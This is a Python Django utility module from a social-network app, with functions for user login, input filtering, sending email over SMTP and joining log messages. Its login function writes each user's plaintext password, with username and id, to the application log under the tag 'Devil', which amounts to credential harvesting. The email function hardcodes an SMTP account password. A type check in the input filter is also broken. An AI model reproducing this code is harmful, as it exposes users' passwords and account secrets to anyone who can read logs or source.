#!/usr/bin/env python
# coding: utf-8
# created by hevlhayt@foxmail.com 
# Date: 2016/7/9
# Time: 13:51
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from django.contrib.auth import authenticate
from django.contrib.auth import login
from django.db.models import Q

from friendnet.methods.session import create_session_id, get_session_id
from friendnet.methods.validation import validate_username, validate_passwd
from friendnet.models import GroupMember, Group
from LineMe.settings import logger


def login_user(request, username, password):

    if validate_username(username) and validate_passwd(password, password):
        user = authenticate(username=username, password=password)
        if user is not None:
            if user.is_active:
                login(request, user)
                create_session_id(request)
                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
                return True
    else:
        return False


def input_filter(arg):
    if arg and (type(arg) is str or unicode):
        return re.sub(ur"[^a-zA-Z0-9\u4e00-\u9fa5]", '', arg)
    else:
        return None


def send_email(receiver, subject, text):
    sender = 'hevlhayt@foxmail.com'
    subject = subject
    smtpserver = 'smtp.qq.com'
    username = 'hevlhayt'
    password = 'cypxypypmmvxbcii'

    msgRoot = MIMEMultipart('related')
    msgRoot['From'] = sender
    msgRoot['To'] = receiver
    msgRoot['Subject'] = subject

    msgText = MIMEText(text, 'html', 'utf-8')
    msgRoot.attach(msgText)

    # fp = open('h:\\python\\1.jpg', 'rb')
    # msgImage = MIMEImage(fp.read())
    # fp.close()

    # msgImage.add_header('Content-ID', '<image1>')
    # msgRoot.attach(msgImage)

    smtp = smtplib.SMTP()
    smtp.connect(smtpserver)
    smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(sender, receiver, msgRoot.as_string())
    smtp.quit()


def logger_join(*args, **kwargs):
    if not args:
        return ''
    else:
        str_arg = ' '.join([str(arg) for arg in args])
        if not kwargs:
            return str_arg
        else:
            return str_arg + ' ' + ' '.join([k.upper()+':'+str(v) for k, v in kwargs.items()])

